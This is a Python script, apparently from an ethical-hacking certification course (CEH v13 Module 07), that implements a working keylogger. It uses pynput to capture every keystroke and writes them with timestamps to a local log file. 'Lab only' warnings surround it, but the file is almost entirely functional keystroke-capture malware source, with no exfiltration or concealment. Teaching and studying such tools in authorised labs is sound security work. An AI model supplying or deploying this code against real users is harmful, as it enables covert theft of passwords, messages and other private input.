#!/usr/bin/env python3
# LAB-ONLY: Simple Keylogger Skeleton (LAB ONLY!)
# CEH v13 Master Module 07
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Basic keylogger (for educational lab use only)
from pynput.keyboard import Listener
import sys
import logging
import os
import platform

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_LOG_FILE = "keystrokes.log"
# -----------------------------------------------------------------------------------

logging.basicConfig(filename=LAB_LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def main():
    print("="*80)
    print("LAB-ONLY: Keylogger Skeleton (running)")
    print("="*80)
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    if os.geteuid() != 0 and platform.system() == "Linux":
        print("WARNING: May need root for full functionality!")
    main()
